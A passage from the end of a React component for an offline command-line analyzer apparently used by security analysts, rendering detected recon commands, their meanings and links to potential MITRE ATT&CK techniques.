                <AlertTriangle className="w-3 h-3" /> Sub-Detections
              </div>
              <ul className="text-[11px] text-amber-200 space-y-1 list-disc list-inside">
                {result.notes.map((n, i) => <li key={i}>{n}</li>)}
              </ul>
            </div>
          ) : null}

          {/* Detected commands */}
          <div className="border border-[#262626] rounded p-3 space-y-2">
            <div className="text-[10px] font-bold uppercase tracking-widest text-blue-400 mb-2 flex items-center gap-1.5">
              <Search className="w-3 h-3" /> Detected Commands
            </div>
            {result.detectedCommands.length === 0 ? (
              <InfoBanner>No recon commands detected. The command may still be legitimate — review in context.</InfoBanner>
            ) : (
              <div className="space-y-1">
                {result.detectedCommands.map((d, i) => (
                  <div key={i} className="flex items-center justify-between gap-2 py-1 border-b border-[#1a1a1a] last:border-b-0">
                    <div className="flex items-center gap-2 flex-wrap min-w-0">
                      <code className="font-mono text-green-300 bg-green-500/10 border border-green-500/30 px-1.5 py-0.5 rounded break-all">{d.command}</code>
                      <ChevronRight className="w-3 h-3 text-[#666] shrink-0" />
                      <span className="text-[11px] text-white">{d.meaning}</span>
                    </div>
                    <code className="font-mono text-[10px] text-amber-300 shrink-0">{d.mitreId}</code>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Security relevance */}
          {result.securityRelevance ? (
            <div className="flex items-center gap-2 text-[11px] flex-wrap">
              <Lightbulb className="w-3 h-3 text-blue-400 shrink-0" />
              <span className="text-[#888] uppercase tracking-wider">Security relevance:</span>
              <span className="text-white">{result.securityRelevance}</span>
            </div>
          ) : null}

          {/* MITRE grid */}
          <div>
            <div className="text-[10px] font-bold uppercase tracking-widest text-blue-400 mb-2 flex items-center gap-1.5">
              <SquareTerminal className="w-3 h-3" /> Potential MITRE ATT&CK
            </div>
            {result.potentialMitres.length === 0 ? (
              <InfoBanner>No MITRE techniques mapped.</InfoBanner>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-1.5">
                {result.potentialMitres.map((m) => (
                  <div key={m.techniqueId} className="border border-[#262626] bg-[#0D0D0D] rounded p-2.5 flex items-center justify-between gap-2">
                    <div className="min-w-0">
                      <code className="font-mono text-[11px] text-blue-300">{m.techniqueId}</code>
                      <div className="text-[10px] text-[#AAA] truncate">{m.name}</div>
                    </div>
                    <a
                      href={mitreUrl(m.techniqueId)}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="px-2 py-1 rounded text-[10px] font-semibold bg-blue-500/10 hover:bg-blue-500/20 border border-blue-500/30 text-blue-300 inline-flex items-center gap-1 shrink-0"
                    >
                      <ExternalLink className="w-3 h-3" /> Open in MITRE
                    </a>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Cross-tool integration */}
          <div className="flex flex-wrap gap-2 border-t border-[#262626] pt-3">
            <button type="button" onClick={handleSendToIoc} className={btnGhost} disabled={!input.trim()}>
              <span className="inline-flex items-center gap-1.5"><Network className="w-3.5 h-3.5" /> Open in IoC Extractor</span>
            </button>
            <button type="button" onClick={handleAddToNote} className={btnPrimary} disabled={!input.trim()}>
              <span className="inline-flex items-center gap-1.5"><Server className="w-3.5 h-3.5" /> Add to Note</span>
            </button>
          </div>
        </div>
      ) : (
        <InfoBanner>
          <span className="font-semibold">100% offline.</span> Paste a command line and select a shell type. Parsing detects recon commands and suggests potential MITRE techniques. Language is hedged (&quot;Potential&quot;, &quot;Possible&quot;) — many recon commands are also used by legitimate admins.
        </InfoBanner>
      )}
    </div>
  );
};

export default CommandLineAnalyzerTool;
